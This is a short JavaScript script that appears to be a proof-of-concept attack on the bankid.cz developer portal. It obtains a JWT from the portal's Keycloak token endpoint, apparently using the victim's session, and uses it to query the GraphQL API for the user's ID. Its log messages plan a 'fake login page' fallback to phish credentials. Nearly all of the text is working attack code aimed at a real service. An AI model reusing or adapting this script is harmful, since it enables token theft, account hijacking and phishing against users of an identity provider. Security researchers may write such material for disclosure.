async function sendData() {
    // Try to get valid JWT token
    let accessToken;
    try {
        const response = await fetch('https://developer.bankid.cz/api/keycloak/access-token', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        });
        const data = await response.json();
        console.log("Request complete:", data);
        accessToken = data.accessToken;
    } catch (error) {
        console.log("[ERR] Unable to fetch valid JWT -> create fake login page fallback");
        console.error("Error:", error);
    }

    console.log("[INF] 1# JWT obtained");

    // Now call graphQL to get userID

    const xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://api.bankid.cz/dev-portal-backend/graphql?query=query+Notifications%7bcurrentUser%7bid%7d%7d&operationName=Notifications', false); 
    xhr.setRequestHeader('Authorization', 'Bearer ' + accessToken);
    xhr.send(null);

    if (xhr.status === 200) {
        console.log(xhr.responseText);
    }else{
        console.log("[ERR] Unable to obtain userID -> create fake login page");
    }

    console.log("[INF] UserID obtained");

}

sendData();
